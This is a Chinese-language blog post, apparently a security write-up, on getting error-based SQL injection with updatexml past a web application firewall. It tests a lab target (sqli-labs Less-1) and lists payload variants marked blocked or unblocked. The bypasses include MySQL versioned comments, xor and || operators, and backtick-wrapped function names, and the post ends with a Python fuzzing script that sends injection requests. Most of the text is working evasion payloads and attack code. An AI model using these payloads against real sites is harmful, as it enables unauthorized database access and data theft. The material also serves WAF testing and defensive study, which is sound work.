# 0x00 探索报错
报错注入的绕过，感觉很少人提过，不少人绕过也有一定的误区吧，这里提一提
```
updatexml 不拦截
updatexml(1,2,3 不拦截
updatexml(1,2) 不拦截
updatexml(1,2,) 不拦截
updatexml(,2,1) 不拦截
updatexml(1,2,!) 拦截
updatexml(1,2,%) 拦截
updatexml(,2,1,hex()) 拦截
and updatexml(1,2,3 不拦截
updatexml(1,2,3) 拦截
and updatexml(1,2,3) 拦截
```
到这里我们 大概知道了，他的判断  `updatexml()` 的完整性 ，当里面按逗号分割出现出现3个字符时，就会拦截，当然有个别特殊的字符串他没过滤 
这样我们在括号里面做手脚的可能性很渺茫，那么我们还有 什么方法呢， 可以尝试把 `updatexml()` 函数分开，或者给updatexml 加个外套。
```
 /*updatexml*/(1,1,1) 不拦截
 /*!updatexml*/(1,1,1) 拦截
 /*!5000updatexml*/(1,1,1) 不拦截
 /*!11440updatexml*/(1,1,1) 不拦截
```
看来 `updatexml()` 函数我们已经绕过了 需要前面加个 运算符号了
```
and /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1)  拦截
or /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 拦截
/*!and*/ /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 拦截
/*!%26%26*/ /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 不拦截
/*!||*/ /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 不拦截
/*!xor*/ /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 不拦截
 | /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 不拦截
 xor /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) 不拦截
```
那么有没有什么可以包裹他的呢，其实我们查看mysql手册找到这么一个符号 开单引号 ASCII 96
```
http://192.168.130.135/Less-1/?id=1' and `updatexml`(1,(select hex(user/**/(/**/))),1)-- +
```
那么我们写个小脚本跑看看 还有没有
```
import requests
import urllib
for i in range(0,177):
    url = r"http://192.168.130.135/Less-1/?id=1%27%20xor%20{fuzz}updatexml{fuzz}(1,(select hex(user/**/(/**/))),1)--%20+".format(fuzz=urllib.quote(chr(i)))
    req = requests.get(url)
    if "F6F7" in req.text:
        print len(req.text),i,urllib.quote(chr(i))
```
发现确实没有其他利用的了，当然你用前面的注释方法也是可行的
# 0x01 文末
脚本只是你的一个思路衍生
#### 本文如有错误，请及时提醒，避免误导他人
* author：404